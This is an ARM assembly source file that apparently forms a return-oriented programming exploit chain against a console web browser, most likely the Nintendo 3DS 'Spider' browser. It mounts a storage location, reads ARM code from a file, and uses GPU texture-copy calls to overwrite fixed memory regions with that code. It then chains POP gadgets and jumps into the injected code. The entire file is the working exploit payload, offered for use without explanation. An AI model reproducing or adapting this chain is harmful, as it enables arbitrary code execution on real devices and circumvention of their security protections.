	.arm
	.text

#include "rop.h"

#ifndef SPIDER_ARM_CODE_SIZE
	#define SPIDER_ARM_CODE_SIZE 0x00004000
#endif

	.global	_start
@---------------------------------------------------------------------------------
_start:
	rop_fs_mount(DMC)
	rop_file_open(THIS, FileName, FILE_READ)
	rop_store(THIS+4, SPIDER_ARM_CODE_OFFSET)
	rop_file_read(THIS, THIS+0x20, BUFFER_LOC, SPIDER_ARM_CODE_SIZE)
	rop_flush_data_cache(BUFFER_LOC, SPIDER_ARM_CODE_SIZE)
	rop_gx_texture_copy(BUFFER_LOC, CODE_TARGET, SPIDER_ARM_CODE_SIZE)
	rop_sleep(1000000000)
	.fill 3, 4, POP_PC
	.word POP_R0_PC
@.org 0x0F4, GARBAGE
	.word ROP_LOC+_start+0x8C
	.fill 11, 4, POP_PC
	.word POP_R0_PC
@.org 0x128, GARBAGE
	.word ROP_LOC+_start, POP_PC, POP_PC
	rop_flush_data_cache(BUFFER_LOC, 0x38400)
@.org 0x158, GARBAGE
	.fill 2, 4, POP_PC
	rop_gx_texture_copy(BUFFER_LOC, 0x1F48F000, SPIDER_ARM_CODE_SIZE)
	rop_sleep(1000000000)
	rop_flush_data_cache(BUFFER_LOC, 0x38400)
	rop_gx_texture_copy(BUFFER_LOC, 0x1F4C7800, SPIDER_ARM_CODE_SIZE)
	.fill 6, 4, POP_PC
	.word POP_R0_PC
@.org 0x21C, GARBAGE
	.word MAGIC
	rop_sleep(1000000000)
	rop_jump_arm
FileName:
	.string16 "dmc:/"
